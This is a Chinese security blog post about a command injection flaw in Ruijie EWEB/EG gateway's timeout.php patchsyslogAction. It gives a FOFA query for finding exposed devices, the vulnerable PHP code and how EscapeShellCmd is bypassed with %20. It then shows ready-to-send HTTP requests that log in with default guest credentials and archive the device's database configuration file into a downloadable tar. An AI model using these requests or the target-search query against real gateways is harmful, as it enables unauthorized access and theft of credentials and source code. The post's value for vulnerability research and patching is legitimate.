---
title: "锐捷-EWEB timeout.php 命令注入漏洞"
source: https://mrxn.net/jswz/ruijieweb-system_pi-timeout-patchsyslog-rce.html
asset_dir: assets/锐捷-eweb-timeout.php-命令注入漏洞
---

# 锐捷-EWEB timeout.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/25 18:39
* 1432浏览
* [0评论](#comment)
* 16分钟阅读

深入探索

路由器

计算机硬件

硬件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `timeout.php` 的 `patchsyslogAction`存在[命令注入](https://mrxn.net/tag/rce)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E) 压缩打包设备上任意文件或目录，造成设备源代码或敏感信息泄露。

代码安全审计

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

看下 `timeout.php` 关键业务 `patchsyslogAction` 逻辑的实现

深入探索

Windows安全工具

物流软件安全

身份验证

```
// 获取post参数 
function p($str) {
    return isset($_POST[$str]) ? $_POST[$str] : false;
}
```

```
function patchsyslogAction(){
    $content = [];
    $commrm = "rm -f syslog.tar";
    $commtar = "tar cvf /tmp/html/syslog.tar /".p("store")."/syslog";
    exec(EscapeShellCmd($commrm), $content);
    exec(EscapeShellCmd($commtar), $content);
    $data = array("status" => true,
        "data" => $content);
    json_echo($data);
}
```

`patchsyslogAction` 接收一个 `store` 参数拼接进tar命令中，当中被打包文件的路径一部分，虽然有`EscapeShellCmd`函数过滤，不能执行完整的命令，但是不影响目录穿越打包文件啊，比如我们打包系统的数据库配置文件 `tmp/html/mvc/config/pgsql.config.php`

> 这套系统的PHP版本比较低（参考前一篇[锐捷EWEB路由器 timeout.php 任意文件上传漏洞](https://mrxn.net/jswz/ruijieweb-system_pi-timeout-rce.html)），如果低于php 5.3.29 可通过%00来截断后续的路径拼接，但是大部分还是 php 5.4 版本
>
> 漏洞修复方案

不过这不是上传名保存路径里，是命令里面，我们只需要使用如 `％20` `%23` 等空格类符号将tar的命令与后续的路径**分隔**开就可以实现打包任意目录或文件， 因此造成[命令注入](https://mrxn.net/tag/rce)漏洞，可直接打包整站！

# 漏洞复现

## 获取cookie

```
POST /ddi/server/login.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest?
```

[![锐捷-EWEB timeout.php 命令注入漏洞](images/img-001-489e6f4b63e4.webp)](https://image.mrxn.net/e2433a412d6049e3b49ff42339f02422.webp)

## 打包文件

```
POST /system_pi/timeout.php?a=patchsyslog HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

store=tmp/html/mvc/config/pgsql.config.php%20
```

[![锐捷-EWEB timeout.php 命令注入漏洞](images/img-002-919366f25bf4.webp)](https://image.mrxn.net/102b9bd014d24194972372465aa6e515.webp)

访问压缩后的文件 syslog.tar

计算机硬件

[![锐捷-EWEB timeout.php 命令注入漏洞](images/img-003-5a397d8a0414.webp)](https://image.mrxn.net/c2c1930bbe634b75bdb7c9a5df220d90.webp)

成功获取到数据库配置文件内容。

漏洞修复方案

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.获取cookie](#toc-5-1-)
* [5.2.打包文件](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[锐捷-EWEB timeout.php 命令注入漏洞](https://mrxn.net/jswz/ruijieweb-system_pi-timeout-patchsyslog-rce.html)  
文章链接：<https://mrxn.net/jswz/ruijieweb-system_pi-timeout-patchsyslog-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALbElEQVR4Aeyc23bbuBJEtef//zmTVmVTRBMQ5VwsPdBrkGJdugmjqcjWzDn/3W63H7+zfrSv3qPZGzW3CScX5kXj8lew16y4uth7q3c0py7/HayB/Ky7/vmUE9gG8nO6t1fW3944cIPH6v3d06v6Preq3WfqGnL/uq4F4daLEB1GrJrZsu4M97XbQPbidf2+EzgMBMbpQ/jZFn0KzMFYB+E9Z/4MrYP0geCszqweJKsOI1/pkBwE7WdefoaQehhxVncYyCx0ad93An9tIJDpv/r0wPM8xIcR+9F4vz1CaszqyUV4LWd+hav+q/wz/a8N5NlNLu/1E/jjgUCeMp8SeM7d2lne3BlC7gcPtAYeGjyu9fseIBn9M7T+LPcV/48H8pWbXdnzEzgMxKl3XLUyB3m67vzHj+13C+sg/qvcPuY76s/QrJ78VYTs1fqOEP/Vfr1ePqs/DGQWurTvO4FtIJCpw3PsW4PknTqM3PyrvvmO1ncdcj+gWwe+6mFw5QP3V7y5jjD3ITo8x32/bSB78bp+3wn851PxVexbhjwFXZdDfO+j3rm6+KpfOWtEyD3lYmVrQfy6rtX9ziF59RVWr99d1ytkdapv0g8DgTwFEOz7gugQ1PeJkMPXfBjzEA5B+4oQHY5opiMk23U5xIeguuj3KEJynUN062Dk6jM8DGQWurTvO4H/YD69PnW3pC6qw9hHX1zl1M2JXe+85/Rn+GrWnAj5nmBE72FO3hFSZw7CzcHIS79eIXUKH7S2gcA4LQh3uu4Zoss7vpo3B8/72R8YfheAY509rREhWX0Yec9BfHXr5CIkB0H1M4TkZ323gZw1ufzvOYHl7yH99jCfqlMWrYPneZj7EN0+Yu8v3+NZtvuQe0Gw+/aG+J2bP0NIfc/BUb9eIf2U3syXA/FpcH9yGKcK4TCidTDX7WdOVBdhXm8eRh/Q2v4rmk34dQEM70fe65d99wDphsDd63kDXZd3ND/D5UBm4Uv79ydw+D0E8hTAiG7FactF9TOE9LUOwiHYdbkIY252P7MdYaztvtyeKw7pY05c5dUhdXLrIDpwu14ht8/62n7KcltOrSM8pggY3xC4//26Cb8uYNTt+8veQB2Sl2+BXxfqkBw88Ffkvg846tZ2hGTVex9599U7QvpBUN96EeLLC69XiKf1IbgNBDItGNF91vT2S13Ug9SrixAdguoiRLePurjS9ffYs5DeMOK9ZvIHJLfqYwkkB0F10XoYfZhz4HoPuX3Y1+GnLKcqul/IVCGo3nPqr2Kvh3l/iA5B+1tfCKNnpmNla3X9jFfNfplX6xzm+zE/w+2vLJtd+N4T2AbitM6282rurA+MT0/vC/Eh2Pv1fPlq8HpN1bkgdfZR7whjDsJ77qyPeUg9cL2H3D7sa3uFwGNK8Lju+4WHB2w2cP/5fxNevIDUQdAyn64Vwpi3rrDXlFYLUgMjlvdsQfJm7N85JAcjmoPoK176NpAi13r/CRx+U3dLq6dAXYRMXS7CXNcXvZ+oDqmHEc3NEJ5n7X2GMO8D0Wf33mv2V+tcfYbXK2R2Km/Ulr+HuCcYnwoIh+Aqp75CGOvNQXSfqo7mREgeOPz7D4hnD2tEiC9fofUizOv0b7fbvVXnd/Hkj+sVcnJA321v7yF9mpCnoOvyFcK8zm8M4svF3k99hT1f3Gxd7xeM94RwM9aJXYfkuw+jDuEQNC/2vvI9Xq8QT+tD8PAeApmuU4NweI5+P71OHVKvL+qvEFKnD+HwOnovSI29RBh1CLdONN8Rkl/pEB+CPbfn1ytkfxofcL29h7gXnwYYp6ne0bpXEdIXgmd13g/GvPoM7akH89qe6xxSB3M0L3q/jvoipF/nwPVZ1u3Dvrb3EBinttonvJbzKbHPinfdvAi53yoH8QFLNgSmn6/BXN8KFxd9D51bBvP+PQ/H3PUe4il+CF4D+ZBBuI1tIL6cIC+j4rUMiqXVkouQOhix+/IzhPQ5y9VeXD3bdbkIuQeM2Pt8ldu/10Hu03154TaQXnzx95zANhAYpwfhbgvCYUT9jjXtWq/q5iD95dWjFow6hMMRrRWrvpa8Y3n7pb/X6hpyL32Yc4gOQfMdq2etvb4NZC9e1+87gcNAIFOtye2XW9xrs2tzryLkfqs8xPde5jovXU2E1JZXC0Z+loN53jqxeu9X1+XiPlvXkPsA1y+Gtw/7OrxC+hQh01OHcAiuvh+ID0Hre14d5rmVD2O+chDNe5RWS94RxjyMvGprWQejr94RkqvaWhBuDkauXngYSInXet8JbB8u1iRrwXx6EL0ytdwyRIdgebX0RYgvFyF61dRSFyG+/CsIqYVg9a9lj7reL3URUic3K4f46qJ+R0heHUZe+vUKqVP4oHX4cNEpw3F6tW+Ibk4sb7a6D6mHoD6Ez3qUtspB6oCK3Rdw/1DRmrv48w+IDnPs+Z8lwz8w1pmHUR+KJsS6iXX9lDU7lHdqh7+yINN2U06zIyQHQfOieRh9dXMw+urmxJWuX2hGhLF3ZWrp13UtOSRfWi31FULy+lVTSw7xS6ul3rE812EgPXzx7z2Bw09ZTsptQKa84qs8jHU9J+8IqYPn6H722Hvpqa941yH3VoeR268jjLleb15dDqkDrveQ24d9bT9luS/ItOQiRHeqon5HfRFSD0HzEA5BdevErkPycESzv4vec4Vf7WsfGPdqH/3C6z3EU/kQ3AYCmZ77qmntlzqMOfV9tq7VO5ZXS72ua3UO8/tA9KpZrVUvSK0+hNun6yuuLsLYp/czJ+pD6tQLt4EUudb7T2D7Kcut9OlBpqgumu8IyUNQ3zoYdRi5eRHiW6/e8Rm3VuxZyD3UX81B6sxDOATt1xHW/vUK6af1Zr4ciFMX3SeM04WRmxdh9Hsfc12Xd18O6QtrtEdHSI1676kOv5ezvveVd19euBxImdf6/hNYDgTGpwPCnTKEu2WYc/PmxK7LO8LY13pxn1cTIbUwor61EF9d1JfD85x5EZ7nIT48cDkQN3Hh957AciBOuW8HMs2urzgkD0Fz8Jybcx+QPAT1IRwe/6NPa0SzYtc7Nyeu/K5D9tLrzEF8CM5yy4EYvvB7T+AwEMj0IOh2nLKo3hHGOn3rOkLy6hBuHYTrq8v3qCfCWGtWX4Tk5CKMuvWiOXGlw7yPdRAfuD7tvX3Y1+HTXvd3Nm39jr1eH/IU6HeE+D0vX+UhdXBEa2D0ui7v+OPHj/v/GYE6PO8Dow/h1r+Ch7+yXim6Mv/uBLbPsnwSxdUtuw/jU9D93geSh6B50Xzn6qL+DM2IZuRi1+WQvUHQvNhzXdcX9UVI35l/vUI8pQ/B7T0EMjV4Dfv+IXUrffY0VBZSB8HSasFzXplakBxQdFjeExj+Oy0IN2xuxdU79jp9GPuri9bBMXe9QjylD8FtIE7tDPu+e14fjtMvr+c7r0wtdUgfeXn7pV6412fXkF4zrzSID8HSasHIS3u2ai+1nmVW3jaQVeDSv/cEDgOBPA0w4tm2YMzXE1LLOhh9GLk5EeKfcUgOHriqUa991ZKLpe3XSofcS1+E6DCi/it4GMgrRVfm353AHw8E8jT4ZLlVmOv6Pa8O87qel8/QXnorri5C7i23HqJDsOvyXrfSe05e+McDqSbX+nsn8M8HAuNT5VMDo+63pC/vqA+p735xM3W9XzCvgejWQbi16qK6CMnrQzgEza3QusJ/PpDVJi59fgKHgdSUZmtefrt/Glp5yNNQ1/u1qus6pB5GNAev6YAl99/O4fFvEjWAzQOUN3T/wDQH0c2JMNf1vQEkJ9/jYSB787r+/hPYBgKZGjzH1RZXT4E6pK/1XZd37Hn9lV4+jPeC8PJqWSuWVguSg6C+CM/16lFrlYexHsLhgdtAbHLhe0/gGsh7z/9w9/8BAAD//08aiS4AAAAGSURBVAMA8g8ZywbnQF8AAAAASUVORK5CYII=)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-system\_pi-timeout-patchsyslog-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

安全研究工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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